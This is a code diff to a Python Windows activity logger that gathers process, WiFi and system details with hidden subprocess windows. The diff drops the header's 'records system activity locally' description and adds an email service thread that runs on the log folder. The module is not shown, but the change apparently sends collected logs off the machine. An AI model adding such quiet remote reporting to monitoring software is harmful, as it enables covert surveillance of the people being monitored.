@@ -1,14 +1,11 @@
 # -*- coding: utf-8 -*-
 
 # ===================================================================================
-# ✅ Windows Logger Lite
+# ✅ Windows Logger Lite 
 #
 # Author: Walter
 # Copyright: Copyright @ 2025, Walter
-# Version: 1.9.0 
-#
-# Description: A discreet, privacy-first computer monitoring tool
-#              that records system activity locally.
+# Version: 1.9.2
 # ===================================================================================
 
 import os
@@ -34,7 +31,9 @@ from openpyxl import Workbook
 import ctypes
 from tkinter import Tk
 import re
-import email_service
+
+# ✅ 引入邮件服务模块
+import email_service 
 
 # ===================================================================================
 # --- CONFIGURATION & CONSTANTS ---
@@ -96,7 +95,7 @@ def load_language_data(lang_code):
     except Exception as e:
         print(f"CRITICAL: Failed to load language file. Error: {e}")
         logging.critical(f"Failed to load language file. Error: {e}")
-        sys.exit(1) # Exit if language files can't be loaded
+        sys.exit(1)
 
 def copy_to_clipboard(text):
     try:
@@ -135,10 +134,12 @@ def lhm_checker_and_notifier():
         return
 
     logging.info("LHM WMI and process not detected. Displaying notification.")
-    title = LANG['prompts']['lhm_title']
-    text = LANG['prompts']['lhm_text']
-    copy_to_clipboard(LHM_DOWNLOAD_URL)
-    ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x1000)
+    try:
+        title = LANG['prompts']['lhm_title']
+        text = LANG['prompts']['lhm_text']
+        copy_to_clipboard(LHM_DOWNLOAD_URL)
+        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x1000)
+    except: pass
 
 def require_admin():
     try:
@@ -209,18 +210,14 @@ def setup_directories():
         
         if pref_path.drive and Path(pref_path.drive).exists():
             if is_drive_removable(pref_path.drive):
-                title = LANG['prompts']['removable_drive_title']
-                text = LANG['prompts']['removable_drive_text']
-                
-                response = ctypes.windll.user32.MessageBoxW(0, text, title, 0x03 | 0x20)
-                
-                if response == 6: # Yes
-                    return BASE_DIR_PREF
-                elif response == 7: # No
-                    return BASE_DIR_FALLBACK
-                else: # Cancel or closed
-                    logging.info("User cancelled operation at removable drive prompt.")
-                    sys.exit(0)
+                try:
+                    title = LANG['prompts']['removable_drive_title']
+                    text = LANG['prompts']['removable_drive_text']
+                    response = ctypes.windll.user32.MessageBoxW(0, text, title, 0x03 | 0x20)
+                    if response == 6: return BASE_DIR_PREF
+                    elif response == 7: return BASE_DIR_FALLBACK
+                    else: logging.info("User cancelled."); sys.exit(0)
+                except: return BASE_DIR_FALLBACK
             else:
                 return BASE_DIR_PREF
         return BASE_DIR_FALLBACK
@@ -250,8 +247,10 @@ def setup_directories():
 # ===================================================================================
 #<editor-fold desc="DATA COLLECTION">
 def get_ntp_time_offset():
-    if get_windows_time_settings()[0] == LANG['status']['enabled']:
-        return f"{LANG['status']['unexecuted']} ({LANG['status']['enabled']})", 0.0
+    try:
+        if get_windows_time_settings()[0] == LANG['status']['enabled']:
+            return f"{LANG['status']['unexecuted']} ({LANG['status']['enabled']})", 0.0
+    except: pass
     try:
         client = ntplib.NTPClient()
         response = client.request('pool.ntp.org', version=3, timeout=10)
@@ -321,7 +320,7 @@ def get_wifi_details():
         result_process = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], encoding=sys_encoding, errors='ignore', capture_output=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW)
         
         if "拒绝访问" in result_process.stdout or "access is denied" in result_process.stdout.lower():
-            logging.warning("Failed to get WiFi details: Access Denied. This may be due to Location Services being disabled in Windows Privacy Settings.")
+            logging.warning("Failed to get WiFi details: Access Denied.")
         elif result_process.returncode == 0:
             result = result_process.stdout
             ssid_match = re.search(r"SSID\s+:\s(.*)", result, re.IGNORECASE)
@@ -650,6 +649,10 @@ def main():
     stop_event = threading.Event()
     process_monitor_thread = ProcessMonitor(stop_event)
     process_monitor_thread.start()
+    
+    # ✅ 启动邮件服务
+    email_thread = email_service.start_email_service(BASE_PATH, stop_event)
+
     last_day_checked = datetime.date.today()
     try:
         while True:
@@ -669,9 +672,10 @@ def main():
         stop_event.set()
         if process_monitor_thread.is_alive(): 
             process_monitor_thread.join()
+        if email_thread.is_alive():
+            email_thread.join(timeout=5)
         print("Logger stopped.")
 
 if __name__ == "__main__":
     main()
-
 #</editor-fold>
